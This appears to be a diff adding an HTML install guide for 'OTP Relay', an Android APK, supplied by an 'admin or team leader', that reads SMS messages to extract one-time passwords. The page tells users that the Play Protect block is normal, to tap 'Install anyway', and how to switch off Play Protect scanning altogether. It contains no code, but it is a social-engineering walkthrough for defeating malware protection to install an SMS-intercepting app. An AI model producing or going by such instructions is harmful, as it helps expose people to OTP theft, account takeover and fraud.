@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OTP Relay - Installation Guide</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: #f5f5f5; color: #333; line-height: 1.6; }
+        .container { max-width: 600px; margin: 0 auto; padding: 20px; }
+        .header { background: linear-gradient(135deg, #4648D4, #6366f1); color: white; padding: 30px 20px; text-align: center; border-radius: 16px; margin-bottom: 24px; }
+        .header h1 { font-size: 24px; margin-bottom: 8px; }
+        .header p { opacity: 0.9; font-size: 14px; }
+        .step { background: white; border-radius: 12px; padding: 20px; margin-bottom: 16px; box-shadow: 0 2px 8px rgba(0,0,0,0.08); }
+        .step-number { display: inline-flex; align-items: center; justify-content: center; width: 32px; height: 32px; background: #4648D4; color: white; border-radius: 50%; font-weight: bold; font-size: 14px; margin-right: 12px; }
+        .step-title { font-size: 16px; font-weight: 600; display: inline; }
+        .step-desc { margin-top: 12px; color: #555; font-size: 14px; }
+        .step-desc strong { color: #333; }
+        .highlight { background: #fef3c7; border-left: 4px solid #f59e0b; padding: 12px 16px; border-radius: 0 8px 8px 0; margin-top: 12px; font-size: 13px; }
+        .highlight strong { color: #92400e; }
+        .success { background: #d1fae5; border-left: 4px solid #10b981; padding: 12px 16px; border-radius: 0 8px 8px 0; margin-top: 12px; font-size: 13px; }
+        .screenshot { background: #f0f0f0; border-radius: 8px; padding: 16px; margin-top: 12px; text-align: center; font-size: 13px; color: #666; border: 1px dashed #ccc; }
+        .btn { display: block; width: 100%; padding: 16px; background: #4648D4; color: white; text-align: center; border-radius: 12px; text-decoration: none; font-weight: bold; font-size: 16px; margin-top: 24px; }
+        .btn:hover { background: #3730a3; }
+        .warning { background: #fee2e2; border-radius: 12px; padding: 16px; margin-bottom: 16px; }
+        .warning h3 { color: #dc2626; font-size: 14px; margin-bottom: 8px; }
+        .warning p { font-size: 13px; color: #991b1b; }
+        .footer { text-align: center; padding: 20px; color: #999; font-size: 12px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>📱 OTP Relay Installation Guide</h1>
+            <p>Follow these steps to install the app on your phone</p>
+        </div>
+
+        <div class="warning">
+            <h3>⚠️ Important: Play Protect Warning</h3>
+            <p>Google Play Protect may block the installation. This is NORMAL — the app reads SMS for OTP extraction. Follow the steps below to install.</p>
+        </div>
+
+        <div class="step">
+            <span class="step-number">1</span>
+            <span class="step-title">Download the APK File</span>
+            <div class="step-desc">
+                Download the <strong>OTP Relay APK</strong> file from your admin or team leader.<br>
+                The file will be named like: <strong>otp-relay-v1.2.0.apk</strong>
+            </div>
+        </div>
+
+        <div class="step">
+            <span class="step-number">2</span>
+            <span class="step-title">Open the APK File</span>
+            <div class="step-desc">
+                Tap on the downloaded APK file to start installation.
+            </div>
+        </div>
+
+        <div class="step">
+            <span class="step-number">3</span>
+            <span class="step-title">Play Protect Warning — DO NOT TAP BLOCK!</span>
+            <div class="step-desc">
+                You will see a warning: <strong>"App blocked to protect your device"</strong>
+            </div>
+            <div class="highlight">
+                <strong>👆 Tap "More details" (NOT "Block")</strong><br>
+                The "Block" button is highlighted, but you need to tap the small "More details" link below it.
+            </div>
+            <div class="screenshot">
+                ⬇️ You will see something like this ⬇️<br><br>
+                <strong style="color:#dc2626;">⚠️ App blocked</strong><br>
+                <span style="color:#666;">This app can request access to sensitive data...</span><br><br>
+                <span style="color:#2563eb; text-decoration:underline;">▶ More details</span><br>
+                <span style="color:#ccc;">━━━━━━━━━━━━━━━━━━━━</span><br>
+                <strong style="color:#dc2626;">Block</strong>
+            </div>
+        </div>
+
+        <div class="step">
+            <span class="step-number">4</span>
+            <span class="step-title">Tap "Install anyway"</span>
+            <div class="step-desc">
+                After tapping "More details", you will see a new option.
+            </div>
+            <div class="highlight">
+                <strong>👆 Tap "Install anyway"</strong><br>
+                This will install the app despite the Play Protect warning.
+            </div>
+            <div class="screenshot">
+                ⬇️ You will see ⬇️<br><br>
+                <span style="color:#666;">More details</span><br><br>
+                <span style="color:#666;">OTP Relay can access: SMS messages...</span><br><br>
+                <span style="color:#2563eb; text-decoration:underline;">▶ Install anyway</span><br>
+                <span style="color:#ccc;">━━━━━━━━━━━━━━━━━━━━</span><br>
+                <strong>Don't install</strong>
+            </div>
+        </div>
+
+        <div class="step">
+            <span class="step-number">5</span>
+            <span class="step-title">App Installed!</span>
+            <div class="step-desc">
+                The app will install normally. Open it and follow the setup steps.
+            </div>
+            <div class="success">
+                ✅ <strong>Done!</strong> The app is now installed and ready to use.
+            </div>
+        </div>
+
+        <div class="step">
+            <span class="step-number">💡</span>
+            <span class="step-title">Alternative: Disable Play Protect (One-time)</span>
+            <div class="step-desc">
+                If you don't want to see the warning every time:<br><br>
+                <strong>1.</strong> Open <strong>Play Store</strong> app<br>
+                <strong>2.</strong> Tap your <strong>profile icon</strong> (top right)<br>
+                <strong>3.</strong> Tap <strong>Play Protect</strong><br>
+                <strong>4.</strong> Tap <strong>Settings</strong> (gear icon)<br>
+                <strong>5.</strong> Turn OFF <strong>"Scan apps with Play Protect"</strong><br><br>
+                <em style="color:#666;">You can turn it back on after installation.</em>
+            </div>
+        </div>
+
+        <a href="/" class="btn">← Back to OTP Relay</a>
+
+        <div class="footer">
+            <p>© 2026 OTP Relay Platform</p>
+            <p>Need help? Contact your administrator.</p>
+        </div>
+    </div>
+</body>
+</html>
